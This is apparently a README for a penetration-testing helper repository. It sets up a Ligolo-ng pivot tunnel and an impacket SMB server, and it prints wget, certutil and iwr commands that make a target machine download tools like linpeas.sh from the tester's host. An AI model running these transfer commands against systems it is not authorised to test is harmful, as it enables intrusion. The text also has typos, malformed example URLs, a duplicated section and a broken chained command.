# PopScripts
This repo includes three scripts to make using ligolo, impacket-smbserver, and transferring files slightly easier by automating required steps and echoing certain commands such that they can be copy/pasted into a new window on a arget machine. If you like all the scripts, it is easiest to just run `sudo ./link.sh`. 


## liggy
This script exists to automate the setup of the Ligolo-ng (https://github.com/nicocha30/ligolo-ng) proxy. It requires Ligolo to be in the /opt folder. It requires an IP range to set up a tunnel, but it will accept a specific IP range or a single IP and convert to the IP range of 0/24. 

Run `sudo chmod +x /opt/liggy/liggy.sh && ln -s /opt/liggy/liggy.sh /usr/local/bin/liggy` to be able to call it as liggy from any directory. 

## served
This script prints cerutil, iwr, and wget commands to be run on a remote target to download files from your machine. The default IP is your tun0 (-IP), the default port (-p) is 80, and the default file (-f) is `file`, but the script can be run with any of those flags. 

Run `sudo chmod +x /opt/PopScripts/served.sh && ln -s /opt/PopScripts/served.sh /usr/local/bin/served` to be able to call it as liggy from any directory. 

Ex: `served -p 443 -f linpeas.sh`
Output:
`wget http:{tun0}:443/linpeas.sh`
`certutil.exe -f -split -urlcache http:{tun0}:443/linpeas.sh -o linpeas.sh`
`iwr -uri http://{tun0]:443/linpeas.sh -o linpeas.sh`

## speedysmb

This script exists to automate the creation of an impacket-smbserver (https://github.com/fortra/impacket/blob/master/examples/smbserver.py) by requesting a username and password, and then printing the commands that need to be run on a remote machine to transfer files. 

Run `sudo chmod +x /opt/PopScripts/speedysmb.sh && ln -s /opt/PopScripts/speedysmb.sh /usr/local/bin/speedysmb` to be able to call it as speedysmb from any directory.

## liggy
This script exists to automate the setup of the Ligolo-ng (https://github.com/nicocha30/ligolo-ng) proxy. It requires Ligolo to be in the /opt folder. It requires an IP range to set up a tunnel, but it will accept a specific IP range or a single IP and convert to the IP range of 0/24. 

Run `sudo chmod +x /opt/PopScripts/liggy.sh && ln -s /opt/PopScripts/liggy.sh /usr/local/bin/liggy` to be able to call it as liggy from any directory. 


## to create symbolic links for all of them

Run `sudo chmod +x /opt/PopScripts/served.sh && chmod +x /opt/PopScripts/speedysmb.sh chmod +x /opt/PopScripts/liggy.sh && ln -s /opt/PopScripts/served.sh /usr/local/bin/served && ln -s /opt/PopScripts/speedysmb.sh /usr/local/bin/speedysmb && ln -s /opt/PopScripts/liggy.sh /usr/local/bin/liggy`

Or run `sudo ./link.sh`

